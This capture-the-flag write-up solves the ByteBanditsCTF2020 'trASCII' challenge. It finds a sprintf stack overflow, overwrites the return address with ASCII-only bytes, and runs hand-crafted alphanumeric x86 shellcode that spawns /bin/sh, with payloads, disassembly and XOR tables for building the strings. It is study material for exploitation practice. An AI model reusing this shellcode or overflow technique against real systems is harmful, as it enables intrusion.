## trASCII (450pt)

### Description

> Author: trashcanna @annatea16


### Attachment

[trASCII](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ByteBanditsCTF2020/pwn/trASCII/trASCII)

### Analysis

the program can convert our input into the format of `%c%d`:

```
% ./trASCII
Welcome to trASCII, a program by trashcanna!
We'll take all your random ASCII garbage and convert it into something magical!
What garbage do you have for us today?
ABCDDEEFF
Thanks for the trash! Here's how I compressed it: A1B1C1D2E2F2
```

> `ABCDDEEFF` -> `A1B1C1D2E2F2`

allowed char in our input (from `0` to `z`): 

> ```
> 0123456789:;<=>?@AB
> CDEFGHIJKLMNOPQRSTU
> VWXYZ[\]^_`abcdefgh
> ijklmnopqrstuvwxyz
> ```

#### buffer overflow

```c
  char s[72]; // [esp+10h] [ebp-48h]
  // ...
  fgets(trash, 0x2710, stdin);
  len = strlen(trash);
  // ...
  for ( i = 0; i < (len - 1); ++i ){
    cnt = 1;
    while ( i < (len - 1) && trash[i] == trash[i + 1] ){
      ++cnt;
      ++i;
    }
    if ( trash[i] > 'z' || trash[i] <= '/' ){
      puts("That's not trash, that's recycling");
      exit(-1);
    }
    s[strlen(s) + 1] = 0;
    s[strlen(s)] = trash[i];
    v0 = strlen(s);
    sprintf(&s[v0], "%d", cnt);  // bof here
  }
  memset(trash, 0, 0x2710u);     // clear trash
  strcpy(trash, s);              // copy result to trash
```

The destination buffer(72 bytes) of `sprintf(&s[v0], "%d", cnt)`  is in stack and it will be overflowed while the length of convert result of `trash` is long enough.

Then the return address will be overwritten by the convert result of `trash`

#### executable trash 

Well... the `trash` in this binary in not recyclable but executable...

![](http://image.taqini.space/img/20200413173810.png)

and some address in `trash` ,for example `0x50315934`, can be converted to ascii:

```python
In [1]: from pwn import *

In [2]: addr = 0x50315734

In [3]: p32(addr)
Out[3]: '4W1P'
```

so we can design *ascii shellcode* in `trash` and  *ret2trash* by bof

### Solution

#### ret2trash

Our goal is overwriting return address with `4W1P`  ,so first of all, we should get the offset of bof. 

generate trash by `cyclic(2000)`:

```shell
% cyclic 2000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabr......
```

send it to the program in `gdb` and watch the return address:

```
   0x80493ce <compact+508>    pop    ebp
 ► 0x80493cf <compact+509>    ret    <0x31753361>
```

>  0x31753361 -> **a3u1**

![](http://image.taqini.space/img/20200413180046.png)

>  we can find the offset by searching `aaau` from trash

Now the return address is overwritten to `a3u1`, but our goal is `4W1P`.

So we should make sure that the first char of return address is a **digit**, not a letter.

the trash should be:

```python
off_ret = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasXXXXWP'
```

> ...a3s1X**4W1P**1

send it and watch return address again:

![](http://image.taqini.space/img/20200413181531.png)

> 0x50315734 -> **4W1P**

No problem! We can puts shellcode into `trash+1300` now.

#### ascii shellcode

Use the same method to get the offset of base address of shellcode:

```python
off_shellcode = 
'0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaai'
```

Designing ascii shellcode was a long but interesting process... 

> Reference: [Hacking/Shellcode/Alphanumeric/x86 printable opcodes](Hacking/Shellcode/Alphanumeric/x86 printable opcodes)

Some useful ascii shellcode are as follows:

```python
# h4W1P - push   0x50315734                # + pop eax -> set eax
# 5xxxx - xor    eax, xxxx                 # use xor to generate string
# j1X41 - eax <- 0                         # clear eax
# 1B2   - xor    DWORD PTR [edx+0x32], eax # assign value to shellcode
# 2J2   - xor    cl, BYTE PTR [edx+0x32]   # nop
# 41    - xor al, 0x31                     # nop
# X     - pop    eax
# P     - push   eax
```

And my ascii shellcode is as follows:

```python
# shellcode
nop = 'P5L1U1X3B2'
nop10 = 'P5L1U1X2J2'
shellcode = ''
shellcode+= 'j1X41H40f56b40f57Z40f53G40h4Y1P40Z40Y1B2' # int 0x80 -> [edx+0x32]
shellcode+= 'h1b11X5b1i15b11n2J2H2J2H'+'40h2Z1P40[1C2' # /bin -> [ebx+0x32]
shellcode+= 'h1w11X5w1A151X2P5X118'+'Y1C6Y40' # //sh -> [ebx+0x36]
shellcode+= 'C2K2'*0x32 # inc ebx -> /bin//sh
shellcode+= 'j4X4t' # eax=64
shellcode+= '2J8H'*53 + '2J22K2' # dec eax -> 0xb
shellcode+= nop10*1 
shellcode+= 'P41j1X41P41Y41P41Z41X'+'2K2' # ecx<-0 edx<-0
```

I don't want to explain all the shellcode... you can analyze them by `disasm()`

```python
In [1]: from pwn import *

In [2]: print disasm('h1b11X5b1i15b11n2J2H2J2H')
   0:   68 31 62 31 31          push   0x31316231
   5:   58                      pop    eax
   6:   35 62 31 69 31          xor    eax, 0x31693162
   b:   35 62 31 31 6e          xor    eax, 0x6e313162
  10:   32 4a 32                xor    cl, BYTE PTR [edx+0x32]
  13:   48                      dec    eax
  14:   32 4a 32                xor    cl, BYTE PTR [edx+0x32]
  17:   48                      dec    eax
```

>  see [details](#More) about string generation by ascii shellcode.

#### getshell

Finally call `sys_execve("/bin/sh")` to getshell

![](http://image.taqini.space/img/20200413192057.png)

### More

You can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/ByteBanditsCTF2020/pwn/trASCII) 

#### Some techniques

There are some techniques about generating string by ascii shellcode:

Ascii shellcode for generating string is as follows:

| **opcode(in ascii)** | **assembly instructions** |
| :------------------: | :-----------------------: |
|        hxxxx         |         push xxxx         |
|        5xxxx         |       xor eax, xxxx       |
|          X           |          pop eax          |
|          H           |          dec eax          |

#### Example

Example1: generating '`/bin`'

1. List a table of string generated by XOR

| target | **1** | **b** | **i** | **n** |
| ------ | :---- | :---- | :---- | :---- |
| tmp1   | 1     | b     | 1     | 1     |
| tmp2   | b     | 1     | i     | 1     |
| tmp3   | b     | 1     | 1     | n     |

2. set `eax` to `1bin` with ascii shellcode 

| ascii | instructions           |
| :---- | :--------------------- |
| h1b11 | push   0x31316231      |
| X     | pop    eax             |
| 5b1i1 | xor    eax, 0x31693162 |
| 5b11n | xor    eax, 0x6e313162 |

3. generate `/bin  ` from `1bin` 

 ```nasm
           ; eax = 1bin
dec eax    ; eax = 0bin
dec eax    ; eax = /bin
 ```

Example2: generating '`//sh`'

1. List a table of string generated by XOR

| target | **/** | **/** | **s** | **h** |
| :----- | :---- | :---- | :---- | :---- |
| tmp1   | 1     | w     | 1     | P     |
| tmp2   | w     | 1     | A     | 1     |
| tmp3   | 1     | X     | 1     | 8     |
| tmp4   | X     | 1     | 2     | 1     |

2. set `eax` to `//sh` with ascii shellcode 

| ascii | instructions           |
| :---- | :--------------------- |
| h1w11 | push   0x31317731      |
| X     | pop    eax             |
| 5w1A1 | xor    eax, 0x31413177 |
| 51X2P | xor    eax, 0x50325831 |
| 5X118 | xor    eax, 0x38313158 |